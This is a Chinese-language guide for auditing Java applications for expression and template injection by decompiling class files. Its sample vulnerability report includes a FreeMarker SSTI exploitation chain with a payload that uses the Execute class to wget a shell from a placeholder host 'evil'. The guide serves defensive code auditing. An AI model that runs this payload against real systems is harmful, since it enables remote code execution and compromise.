# 表达式注入审计反编译策略指南

## 目录

- [何时反编译](#何时反编译)
- [表达式引擎类识别与定位](#表达式引擎类识别与定位)
- [反编译结果检查](#反编译结果检查)
- [常见问题](#常见问题)

---

## 何时反编译

### 必须反编译的场景

1. **项目只有编译后的字节码**
   - WAR/JAR 包部署，无源码
   - 第三方依赖中的表达式处理组件

2. **表达式引擎使用定义在 .class 文件中**
   - 自定义表达式工具类
   - Struts2 Action 中的 OGNL 处理
   - Spring 配置中的 SpEL 表达式

3. **需要检查沙箱配置**
   - OGNL `_memberAccess` 配置
   - FreeMarker `new_builtin_class_resolver` 配置
   - Groovy `CompilerConfiguration` 配置
   - ScriptEngine `ClassFilter` 配置

### 不需要反编译的场景

1. 源码已存在且可读取
2. 标准表达式引擎库类
3. yaml/properties 配置文件可直接读取

---

## 表达式引擎类识别与定位

### 按类名模式定位

```bash
# OGNL 相关
find . -name "*Ognl*.class" -o -name "*OGNL*.class"
find . -name "*Action*.class"        # Struts2 Action

# SpEL 相关
find . -name "*Expression*.class" -o -name "*Spel*.class"
find . -name "*Evaluation*.class" -o -name "*Eval*.class"

# Groovy 相关
find . -name "*Groovy*.class" -o -name "*Script*.class"

# 模板引擎
find . -name "*Template*.class" -o -name "*Marker*.class"
find . -name "*Velocity*.class" -o -name "*Thymeleaf*.class"

# Controller 层 (追踪用户输入)
find . -name "*Controller*.class" -o -name "*Servlet*.class"

# 配置类 (检查沙箱配置)
find . -name "*Config*.class" -o -name "*Configuration*.class"
```

### 按字节码特征定位

```bash
# 搜索表达式引擎 API 调用
find . -name "*.class" -exec strings {} \; | grep -l "Ognl\.getValue\|Ognl\.setValue\|SpelExpressionParser\|GroovyShell\|ScriptEngine"

# 搜索模板引擎 API 调用
find . -name "*.class" -exec strings {} \; | grep -l "Template\.process\|Velocity\.evaluate\|SpringTemplateEngine"

# 搜索沙箱配置特征
find . -name "*.class" -exec strings {} \; | grep -l "allowStaticMethodAccess\|excludedClasses\|new_builtin_class_resolver\|api_builtin_enabled"
```

---

## 反编译结果检查

### 检查要点

反编译后重点关注：

```java
// 1. 引擎类型识别
Ognl.getValue(expression, context, root);        // OGNL
new SpelExpressionParser().parseExpression(exp); // SpEL
new GroovyShell().evaluate(script);              // Groovy
new ScriptEngineManager().getEngineByName("js"); // JavaScript

// 2. 表达式来源追踪
String expression = request.getParameter("exp");  // ❌ 用户直接控制
String expression = config.getExpression();       // ⚠️ 配置文件
String expression = buildExpression(userInput);   // ⚠️ 需要分析 buildExpression

// 3. 沙箱配置检查 (OGNL)
// ✅ 安全: _memberAccess 受限
ognlContext.setMemberAccess(new DefaultMemberAccess(false));

// ❌ 危险: _memberAccess 开放
ognlContext.setMemberAccess(new DefaultMemberAccess(true));

// 4. 沙箱配置检查 (FreeMarker)
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); // ✅ 安全
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);          // ⚠️ 部分安全
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_ALL_RESOLVER);     // ❌ 危险

// 5. 鉴权信息
@PreAuthorize("hasRole('ADMIN')")   // 有鉴权
// 或无任何注解                     // 无鉴权
```

### 示例检查

```java
// 反编译后的 ReportService 示例
public class ReportService {

    private Configuration freemarkerConfig;

    // ❌ 高危：FreeMarker 无沙箱配置，模板用户可控
    public String generateReport(String templateContent, Map<String, Object> data) {
        // 沙箱检查: freemarkerConfig 的 newBuiltinClassResolver 是什么？
        // 若构造函数中未设置 → 默认为 UNRESTRICTED_RESOLVER → 可 RCE
        Template template = new Template("report", new StringReader(templateContent), freemarkerConfig);
        StringWriter writer = new StringWriter();
        template.process(data, writer);
        return writer.toString();
    }

    // ✅ 安全：沙箱已配置 + 模板内容已预定义
    public String generateReportSafe(String reportType, Map<String, Object> data) {
        // freemarkerConfig 在类构造时设置了 ALLOWS_NOTHING_RESOLVER
        Template template = freemarkerConfig.getTemplate(reportType + ".html");
        StringWriter writer = new StringWriter();
        template.process(data, writer);
        return writer.toString();
    }
}
```

**提取信息：**

| 方法 | 引擎 | 模板来源 | 沙箱 | 变量可控性 | 漏洞判定 |
|------|------|---------|------|-----------|----------|
| generateReport | FreeMarker | 参数 templateContent (完全可控) | 未知(需查构造函数) | 参数 data | **如沙箱为 UNRESTRICTED → Critical** |
| generateReportSafe | FreeMarker | 文件模板 (不可控) | ALLOWS_NOTHING | 参数 data | 安全 |

---

## 反编译策略

### 策略 1: 引擎优先扫描

```bash
# 步骤 1: 通过依赖确定有哪些表达式引擎
find . -name "*.jar" | grep -iE "ognl|spring-expression|groovy|freemarker|velocity|mvel|jexl"

# 步骤 2: 搜索引擎 API 调用
strings_find "SpelExpressionParser|GroovyShell|Ognl\.getValue|Template\.process"

# 步骤 3: 反编译使用引擎的类
for cls in $(find_expr_classes); do
    java -jar cfr.jar "$cls" --outputdir decompiled/
done

# 步骤 4: 反编译配置类，检查沙箱
for cls in $(find_config_classes); do
    java -jar cfr.jar "$cls" --outputdir decompiled/
done

# 步骤 5: 反编译 Controller 层，追踪表达式来源
for cls in $(find_controller_classes); do
    java -jar cfr.jar "$cls" --outputdir decompiled/
done
```

### 策略 2: 层级反编译

```
第一层: 表达式/模板工具类
  → *Expression*.class, *Template*.class, *Script*.class

第二层: Controller/路由层 (追踪表达式来源)
  → *Controller*.class, *Action*.class, *Servlet*.class

第三层: 配置类 (沙箱配置)
  → *Config*.class, *Configuration*.class, *Properties*.class

第四层: 自定义沙箱/安全类
  → *Security*.class, *Sandbox*.class, *Guard*.class
```

---

## 反编译结果记录

输出时必须标注反编译来源：

```markdown
### [EXPR-001] FreeMarker SSTI - 模板内容可控

| 项目 | 信息 |
|------|------|
| 漏洞等级 | Critical |
| 位置 | ReportService.generateReport (ReportService.java:35) |
| 来源 | **反编译 WEB-INF/classes/com/example/ReportService.class** |
| 引擎 | FreeMarker 2.3.28 |
| 沙箱 | **未检查到 newBuiltinClassResolver 设置 → 默认为 UNRESTRICTED** |

漏洞描述:
- 模板内容来自方法参数 templateContent，用户完全可控
- FreeMarker Configuration 未设置 newBuiltinClassResolver
- 默认 ALLOWS_ALL_RESOLVER 允许 ?new 调用任意类构造函数
- 可执行 Execute?new()('id') 实现 RCE

利用链:
1. 构造 FreeMarker SSTI payload
2. <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("wget http://evil/shell")}
3. 通过 POST 请求传入 templateContent 参数

漏洞代码:
\```java
public String generateReport(String templateContent, Map data) {
    Template t = new Template("rpt", new StringReader(templateContent), cfg);
    StringWriter w = new StringWriter();
    t.process(data, w);
    return w.toString();
}
\```
```

---

## 常见问题

### 问题 1: 沙箱配置在 yaml/properties 中

**表现：** FreeMarker/Thymeleaf 的沙箱配置通常在 `application.yaml` 中

**处理：** 直接读取配置文件，不需要反编译

```bash
grep -rn "new_builtin_class_resolver\|api_builtin_enabled\|expose-spring-macro-helpers" --include="*.yaml" --include="*.yml" --include="*.properties"
```

### 问题 2: Struts2 Action 中的隐式 OGNL

**表现：** Struts2 框架自动对 URL 参数/Header 求值 OGNL，Action 代码中无显式调用

**处理：** 识别 Struts2 项目后（`web.xml` 中的 `StrutsPrepareAndExecuteFilter`），直接按 Struts2 版本判定风险，不需要反编译每个 Action

### 问题 3: Groovy 脚本动态加载

**表现：** 项目在运行时动态加载 `.groovy` 文件

**处理：** 
1. 反编译加载脚本的 Java 类，找到脚本路径
2. 检查脚本路径是否可由用户通过路径穿越控制
3. 检查脚本是否可能通过上传功能写入

### 问题 4: 表达式通过模板文件注入

**表现：** 不直接在 Java 代码中调用引擎 API，而是通过模板文件中的表达式

**处理：** 审计模板文件内容，检查是否有 `${...}` / `#{...}` / `<#...>` 等注入点
